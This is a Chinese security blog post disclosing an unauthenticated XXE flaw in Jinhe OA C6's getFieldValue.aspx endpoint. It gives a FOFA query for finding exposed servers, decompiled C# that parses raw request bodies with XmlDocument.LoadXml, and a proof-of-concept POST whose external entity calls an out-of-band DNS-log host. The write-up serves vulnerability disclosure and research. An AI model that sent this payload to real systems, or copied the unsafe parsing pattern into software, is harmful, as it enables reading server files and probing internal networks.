---
title: "金和OA getFieldValue.aspx XXE漏洞"
source: https://mrxn.net/jswz/jhsoft-getFieldValue-xxe.html
asset_dir: assets/金和oa-getfieldvalue.aspx-xxe漏洞
---

# 金和OA getFieldValue.aspx XXE漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2026/1/22 13:31
- 221浏览
- [0评论](#comment)
- 10分钟阅读

深入探索

网络安全会议

文本剥离工具

文件大小转换

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `getFieldValue.aspx` 接口处存在[XXE](https://mrxn.net/tag/XXE)漏洞，未授权的攻击者可以通过此漏洞读取服务器上敏感文件或探测内网服务信息，进一步利用可导致服务器失陷。

漏洞扫描服务

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

直接根据 `getFieldValue.aspx` 在 `bin` 目录下查找 `JHSoft.Web.Govset.dll` 将其进行反编译后找到 **getFieldValue** 的处理逻辑

```
protected void Page_Load(object sender, EventArgs e)
{
  Stream inputStream = this.Request.InputStream;
  byte[] numArray = new byte[(int) inputStream.Length];
  inputStream.Read(numArray, 0, numArray.Length);
  inputStream.Close();
  string xml = Encoding.UTF8.GetString(numArray);
  XmlDocument xmlDocument = new XmlDocument();
  xmlDocument.LoadXml(xml);
```

请求内容直接使 `XmlDocument.LoadXml` 解析，造成[XXE](https://mrxn.net/tag/XXE)漏洞。

# 漏洞复现

深入探索

漏洞修复方案

防火墙软件

安全研究报告

```
POST /c6/Jhsoft.Web.govset/getFieldValue.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://xxe.dnslog.pt/xxe_test">
%remote;]>
<root/>
```

在DNSLOG平台成功收到请求

网络安全

[![金和OA getFieldValue.aspx XXE漏洞](images/img-001-ab40f77f1ff8.webp)](https://image.mrxn.net/b12efeef8c1a4140adbccbbbda98c37e.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#0day](https://mrxn.net/tag/0day)
- [#XXE](https://mrxn.net/tag/XXE)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
